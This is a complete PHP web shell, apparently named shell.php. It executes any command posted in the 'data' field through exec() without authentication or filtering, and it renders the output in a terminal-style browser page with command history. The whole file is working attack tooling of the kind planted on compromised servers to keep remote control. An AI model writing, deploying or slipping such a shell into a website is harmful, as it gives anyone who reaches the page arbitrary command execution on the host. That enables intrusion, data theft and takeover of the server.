<?php

	//Prompt Query Handler
	if(ISSET($_POST['data']) && !empty($_POST['data']))
	{
		//Grab data and redirect stdout
		$command = $_POST['data'] . " 2>&1";
		
		//Execute command on server, store output into output
		exec($command,$output);		

		//Return the output
		echo json_encode($output);
		die();
	}

	//Set our prompt text e.g "[apache@localhost] >> "
	$PS1 = str_replace("\n","","[".shell_exec('whoami')." @ ".shell_exec("hostname")."] >> ");
?>
<html>
	<head>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
		<style>
			body{
				background-color:black;
			}
			p{
				color:green;
			}
			.text-light{
				color:lightgreen;
			}
			.text-dark{
				color:darkgreen;
			}
			#wrapper{
				position:relative;
				height:100%;
				width:100%;
			}
			#promptBox{
				color:green;
				padding:3px;
				position:fixed;
				bottom:0;
				width:100%;
				height:30px;
				border-top:1px solid white;
			}
			#outputBox{
				color:green;
			}
			.promptPS1{
				line-height:23px;
				float:left;
				color:white;
			}
			.promptInput{
				padding-left:5px;
				color:green;
				background-color:transparent;
				width:80%;
				float:left;
				border:none;
				height:22px
			}
			#resultWrapper{
				color:green;
				position:fixed;
				bottom:50px;
				width:100%;
				overflow-x:hidden;	
				overflow-y:scroll;
			}
			.result{
				position:absolute;
				bottom:0;
				width:99%;
				vertical-align:bottom;
				color:white;
				border:1px dashed yellow;
			}
		</style>
	</head>
	<div id="wrapper">
		<body>
			<div id="resultWrapper">
			</div>
			<div id="promptBox"><div class="promptPS1"> 
				<?php print $PS1; ?>
			</div>
			<input id="shell" class="promptInput" autofocus on type="text">  </div>
		</body>	
	</div>
</html>

<script type="text/javascript">
//Looks after the up/down command cycling
var commandHistory = [" "];
var historyPointer = 0;
//Used to control command std_out flow
var stackpointer = 0;
var resultCounter = [0];

var prompt = document.getElementById("shell");

//prompt input event handler
prompt.addEventListener("keyup", function(event) 
{
	event.preventDefault();
	if(event.keyCode == 38)
	{
		if(commandHistory[0] != undefined && historyPointer > 0)
		{
			prompt.value = commandHistory[historyPointer];
			historyPointer--;
		}
	}	
   	else if(event.keyCode == 40)
	{
		if(commandHistory[0] != undefined && historyPointer < commandHistory.length-1)
		{
			prompt.value = commandHistory[historyPointer+1];
			historyPointer++;
		}
	}  
	else if(event.keyCode == 13) 
	{
		var command = document.getElementById("shell").value;
		if(command == "clear")
			clearBuffer();
		else
		{
			$.ajax({
				type: "POST",
				url: "shell.php",
				datatype: 'json',
				cache: false,
				data: { data : command },
				success: function(data)
				{
					//Create div with result from exec()
					$("#resultWrapper").append("<div id='"+stackpointer+"'><a style='margin-bottom:2px;color:white;'><?php echo $PS1 ?> $ "+ command + "</a><br>" + printJSON(data) + "</div>");				
					//Handle the text buffer/flow
					stackpointer++;
					resultCounter.push(stackpointer);

					//If more than 10 divs, start clearing.
					if(resultCounter.length > 10)
					{
						document.getElementById(resultCounter[0]).remove();
						resultCounter.shift();
					}
					//Keep at the top of text stack
					var scrollRegion = document.getElementById("resultWrapper");
					scrollRegion.scrollTop = scrollRegion.scrollHeight;
					//Add an entry to our command history
					commandHistory.push(prompt.value);
					//Clear our input prompt
					prompt.value = "";
					//Increase the command history counter			
					historyPointer++;
				}
			});  
    	}
	}
});

//Will deserialize the result of a command
function printJSON(info)
{
	var myObj = JSON.parse(info);
	var output = "";

	for(i = 0; i < myObj.length; i++)
	{
		output += (myObj[i]) + "</br>";
	}
	console.log(output);
	return output;
}
//Empties output field.
function clearBuffer()
{
	document.getElementById("resultWrapper").innerHTML= "";	
	prompt.value = "";
}
</script>
